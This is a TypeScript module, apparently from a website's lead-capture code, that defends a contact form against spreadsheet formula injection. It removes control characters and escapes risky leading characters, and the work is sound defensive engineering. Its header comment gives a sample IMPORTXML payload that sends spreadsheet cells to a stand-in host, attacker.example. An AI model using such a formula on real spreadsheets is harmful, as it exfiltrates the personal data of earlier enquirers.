/**
 * Making a visitor's own words safe to put in someone else's document.
 *
 * `lead-context.ts` already normalises the values the *site* attaches to a lead
 * — the source path, the quiz answers, the resolved interest labels. This is
 * the other half: the six fields a human types, plus any question the client
 * has added to the form. Those were passing through on a trim and a length cap
 * alone, which is how the payload came to be the least-checked part of the
 * pipeline while its metadata was the most.
 *
 * Two separate problems, and they need different treatment:
 *
 * CONTROL CHARACTERS change the shape of a record. The reasoning is already
 * written down in `sanitizeContextValue` — an embedded newline silently turns
 * one row into two, or one header into two — and it applies with more force
 * here, because these are the values an attacker chooses directly.
 *
 * A LEADING `=`, `+`, `-`, `@`, TAB OR CR MAKES A SPREADSHEET CELL EXECUTABLE.
 * The contact route's own comment says where these land: "this lands in a
 * spreadsheet, where one key per column is the shape that needs no transform
 * step in between". So a `name` of `=IMPORTXML("https://attacker.example/?d="&
 * CONCATENATE(A1:Z1),"//a")` is not text in a cell — it is a formula that runs
 * when the client opens their lead book, and that book holds every previous
 * enquirer's name, email and phone. The same shape reaches Excel as DDE and
 * Google Sheets as `IMPORTXML`/`IMPORTDATA`.
 *
 * The neutraliser is a leading apostrophe, which is the convention every
 * spreadsheet understands as "treat the rest as text". It is preferred over
 * stripping the character because the character is often legitimate: a message
 * beginning "-- Sent from my phone" or an org called "@Home Care" should still
 * read correctly to the human who opens the row.
 *
 * MESSAGE KEEPS ITS NEWLINES. It is prose, it is read by a person, and
 * flattening a five-paragraph enquiry into one line to protect a spreadsheet
 * would damage the thing the client actually wants. Its newlines are normalised
 * to `\n` and every other control character is removed, which is enough: the
 * formula vector is about the FIRST character of a cell, and that is handled.
 *
 * Deliberately free of imports so the contact route, the admin and any future
 * writer can all use it.
 */

/** Ceiling for a single visible form value. The message box is the long one. */
export const MAX_ANSWER_LENGTH = 5000;

/**
 * The characters that make a spreadsheet treat a cell as a formula.
 *
 * Tab and carriage return are here because several importers strip leading
 * whitespace before deciding, so `\t=cmd` becomes `=cmd` by the time it is
 * parsed.
 */
const FORMULA_LEAD = new Set(["=", "+", "-", "@", "\t", "\r"]);

function isControlChar(code: number): boolean {
  return code < 0x20 || code === 0x7f;
}

/**
 * Neutralise a value that will be written into a cell.
 *
 * Applied after trimming, because ` =cmd()` is the same attack as `=cmd()` and
 * the leading space would otherwise hide it.
 */
function defuseFormula(value: string): string {
  if (value.length === 0) return value;
  return FORMULA_LEAD.has(value[0]) ? `'${value}` : value;
}

/**
 * A single-line answer: name, org, email, phone, event date, and any question
 * the client has added.
 */
export function sanitizeAnswer(value: unknown, maxLength = MAX_ANSWER_LENGTH): string {
  if (typeof value !== "string") return "";

  let out = "";
  for (const ch of value) {
    out += isControlChar(ch.charCodeAt(0)) ? " " : ch;
  }

  return defuseFormula(out.replace(/\s+/g, " ").trim().slice(0, maxLength));
}

/**
 * A multi-line answer. Paragraphs survive; everything else that could reshape
 * a record does not.
 */
export function sanitizeMessage(value: unknown, maxLength = MAX_ANSWER_LENGTH): string {
  if (typeof value !== "string") return "";

  const normalised = value.replace(/\r\n?/g, "\n");

  let out = "";
  for (const ch of normalised) {
    const code = ch.charCodeAt(0);
    if (ch === "\n") out += ch;
    else if (isControlChar(code)) out += " ";
    else out += ch;
  }

  /* Collapse runs of blank lines, trim each line's trailing space, and cap the
     whole thing — then defuse, because the first character of the cell is what
     a spreadsheet reads regardless of what follows it. */
  const tidied = out
    .split("\n")
    .map((line) => line.replace(/[ \t]+/g, " ").trim())
    .join("\n")
    .replace(/\n{3,}/g, "\n\n")
    .trim()
    .slice(0, maxLength);

  return defuseFormula(tidied);
}

/** Field names whose answers are prose rather than a single line. */
const MULTILINE_FIELDS = new Set(["message"]);

/** Sanitise one form answer by field name, picking the right treatment. */
export function sanitizeFormAnswer(name: string, value: unknown): string {
  return MULTILINE_FIELDS.has(name)
    ? sanitizeMessage(value)
    : sanitizeAnswer(value);
}
